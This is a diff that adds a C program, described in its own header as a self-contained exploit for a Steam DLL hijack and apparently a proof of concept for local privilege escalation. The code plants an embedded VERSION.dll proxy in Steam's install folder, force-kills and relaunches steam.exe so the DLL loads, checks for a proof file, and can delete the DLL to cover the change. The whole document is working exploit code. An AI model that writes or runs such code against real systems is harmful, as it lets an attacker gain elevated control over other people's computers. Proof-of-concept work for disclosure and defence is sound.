@@ -1,0 +1,35 @@
+/**
+ * Self-contained exploit for Steam DLL hijack.
+ * 1. Extracts embedded VERSION.dll proxy
+ * 2. Kills steam.exe
+ * 3. Relaunches steam.exe
+ * 4. Verifies execution
+ * 5. Cleans up automatically
+ */
+int main(int argc, char *argv[]) {
+    // Extract embedded DLL to Steam directory
+    extract_resource(IDR_VERSION_DLL,
+        "C:\\Program Files (x86)\\Steam\\VERSION.dll");
+
+    // Kill Steam
+    system("taskkill /f /im steam.exe >nul 2>&1");
+    Sleep(2000);
+
+    // Relaunch
+    ShellExecuteA(NULL, "open",
+        "C:\\Program Files (x86)\\Steam\\steam.exe",
+        NULL, NULL, SW_SHOW);
+    Sleep(5000);
+
+    // Verify
+    if (file_exists("C:\\Users\\Public\\steam_lpe_proof.txt")) {
+        printf("[+] EXPLOIT CONFIRMED\n");
+    }
+
+    // Clean up (optional)
+    if (argc < 2 || strcmp(argv[1], "--no-cleanup")) {
+        DeleteFileA(
+            "C:\\Program Files (x86)\\Steam\\VERSION.dll");
+    }
+    return 0;
+}
